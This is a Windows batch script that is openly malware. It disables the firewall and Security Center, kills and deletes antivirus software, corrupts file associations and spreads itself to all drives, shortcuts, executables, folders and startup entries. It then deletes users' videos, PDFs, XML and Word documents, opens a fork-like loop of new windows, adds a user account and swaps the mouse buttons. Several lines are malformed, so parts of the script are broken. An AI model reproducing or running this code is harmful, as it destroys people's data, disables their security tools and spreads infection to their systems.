﻿@echo off
REM ---------------------------------
REM Kill Anti-Virus
net stop "Security Center"
netsh firewall set opmode mode=disable
tskill /A av*
tskill /A fire*
tskill /A anti*
 cls()
tskill /A spy*
tskill /A bullguard
tskill /A PersFw
tskill /A KAV*
tskill /A ZONEALARM
tskill /A SAFEWEB
 cls()
tskill /A OUTPOST
tskill /A nv*
tskill /A nav*
tskill /A F-*
tskill /A ESAFE
tskill /A cle
cls()
tskill /A BLACKICE
tskill /A def*
tskill /A kav
tskill /A kav*
tskill /A avg*
tskill /A ash*
 cls()
tskill /A aswupdsv
tskill /A ewid*
tskill /A guard*
tskill /A guar*
 /A gcasDt*
tskill /A msmp*
cls()
tskill /A mcafe*
tskill /A mghtml
tskill /A msiexec
tskill /A outpost
tskill /A isafe
tskill /A zap*
cls()
tskill /A zauinst
tskill /A upd*
tskill /A zlclien*
tskill /A minilog
tskill /A cc*
tskill /A norton*
cls()
tskill /A norton au*
tskill /A ccc*
tskill /A npfmn*
tskill /A loge*
tskill /A nisum*
tskill /A issvc
tskill /A tmp*
cls()
tskill /A tmn*
tskill /A pcc*
tskill /A cpd*
tskill /A pop*
tskill /A pav*
tskill /A padmin
 cls()
tskill /A panda*
tskill /A avsch*
tskill /A sche*
tskill /A syman*
tskill /A virus*
tskill /A realm*
cls()
tskill /A sweep*
tskill /A scan*
tskill /A ad-*
tskill /A safe*
tskill /A avas*
tskill /A norm*
cls()
tskill /A offg*
del /Q /F C:\Program Files\alwils~1\avast4\*.* 
del /Q /F C:\Program Files\Lavasoft\Ad-awa~1\*.exe 
del /Q /F C:\Program Files\kasper~1\*.exe 
 cls()
del /Q /F C:\Program Files\trojan~1\*.exe 
del /Q /F C:\Program Files\f-prot95\*.dll 
del /Q /F C:\Program Files\tbav\*.dat 
 cls()
del /Q /F C:\Program Files\avpersonal\*.vdf 
del /Q /F C:\Program Files\Norton~1\*.cnt 
del /Q /F C:\Program Files\Mcafee\*.* 
cls()
del /Q /F C:\Program Files\Norton~1\Norton~1\Norton~3\*.* 
del /Q /F C:\Program Files\Norton~1\Norton~1\speedd~1\*.* 
del /Q /F C:\Program Files\Norton~1\Norton~1\*.* 
del /Q /F C:\Program Files\Norton~1\*.* 
  cls()
del /Q /F C:\Program Files\avgamsr\*.exe 
del /Q /F C:\Program Files\avgamsvr\*.exe 
del /Q /F C:\Program Files\avgemc\*.exe 
        cls()
del /Q /F C:\Program Files\avgcc\*.exe 
del /Q /F C:\Program Files\avgupsvc\*.exe 
del /Q /F C:\Program Files\grisoft 
del /Q /F C:\Program Files\nood32krn\*.exe 
del /Q /F C:\Program Files\nood32\*.exe 
cls()
del /Q /F C:\Program Files\nod32 
del /Q /F C:\Program Files\nood32
del /Q /F C:\Program Files\kav\*.exe 
del /Q /F C:\Program Files\kavmm\*.exe 
del /Q /F C:\Program Files\kaspersky\*.*
       cls()
del /Q /F C:\Program Files\ewidoctrl\*.exe 
del /Q /F C:\Program Files\guard\*.exe 
del /Q /F C:\Program Files\ewido\*.exe 
      cls()
del /Q /F C:\Program Files\pavprsrv\*.exe 
del /Q /F C:\Program Files\pavprot\*.exe 
del /Q /F C:\Program Files\avengine\*.exe 
  cls()
del /Q /F C:\Program Files\apvxdwin\*.exe 
del /Q /F C:\Program Files\webproxy\*.exe 
del /Q /F C:\Program Files\panda software\*.* 
  REM ---------------------------------
REM ---------------------------------
REM Confuse File Extensions Powerup
assoc.dll = txtfile
assoc.exe = pngfile
assoc .vbs=Visual Style
assoc.reg = xmlfile
assoc.txt = regfile
REM ---------------------------------
REM Confuse File Extensions for text
assoc.mp3 = txtfile
assoc.xml = txtfile
assoc.png = txtfile
REM ---------------------------------
REM ---------------------------------
REM Infect All Drives
for %%E In (A,B,C,D,E,F,G,H,I,J,K,L,M,N,O,P,Q,R,S,T,U,V,W,X,Y,Z) Do (
copy /Y %0 %%E:\
echo [AutoRun] > %%E:\autorun.inf
echo open="%%E:\%0" >> %%E:\autorun.inf
echo action=Open folder to see files... >> %%E:\autorun.inf)
REM ---------------------------------
rem ---------------------------------
rem Infect All Lnk
assoc .lnk=batfile
DIR /S/B %SystemDrive%\*.lnk >> InfList_lnk.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (InfList_lnk.txt) do copy %0 "%%j:%%k"
rem ---------------------------------
REM ---------------------------------
REM Infect Reg Run Key
valinf = "rundll32_%random%_toolbar"
reginf = "hklm\Software\Microsoft\Windows\CurrentVersion\Run"
reg add %reginf% /v %valinf% /t "REG_SZ" /d %0 /f > nul
REM ---------------------------------
@echo off
: a
Start
Start
Start
echo
*you have been hacked*
Start
Start
goto :a
REM ---------------------------------
 REM Infect Autoexec.bat
echo start " %0>>%SystemDrive%\AUTOEXEC.BAT
REM ---------------------------------
REM ---------------------------------
REM Infect All Folders
Dir %SystemRoot% /s /b > PathHost
For /f %%a In (PathHost) Do Copy /y %0 %%a > Nul
Del /f /s /q PathHost > Nul
REM ---------------------------------
REM ---------------------------------
REM Infect All Exe
assoc.exe = batfile
DIR /S/B %SystemDrive%\*.exe >> InfList_exe.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (InfList_exe.txt) do copy %0 "%%j:%%k"
REM ---------------------------------
 vREM ---------------------------------
 REM Delete All Mp4
 DIR /S/B %SystemDrive%\*.mp4 >> FIleList_mp4.txt
 echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_mp4.txt) do del "%%j:%%k"
 REM ---------------------------------
rem ---------------------------------
rem Delete All Pdf
DIR /S/B %SystemDrive%\*.pdf >> FIleList_pdf.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_pdf.txt) do del "%%j:%%k"
rem ---------------------------------
REM ---------------------------------
REM Delete All Xml
DIR /S/B %SystemDrive%\*.xml >> FIleList_xml.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_xml.txt) do del "%%j:%%k"
 REM ------------------------
@Echo Off
for /f "tokens=1-1 delims=\" %%a in ("%PATH%") do (Set Root=%%a)
%Root%
Net user lemoz/add
REM ---------------------------------
REM Swap Mouse Buttons
RUNDLL32(USER32.DLL, SwapMouseButton)
rem ---------------------------------
REM ---------------------------------
 REM Delete All Documents
DIR /S/B %SystemDrive%\*.doc >> FIleList_doc.txt
echo Y | FOR /F "tokens=1,* delims=: " %%j in (FIleList_doc.txt) do del "%%j:%%k"
 REM ---------------------------------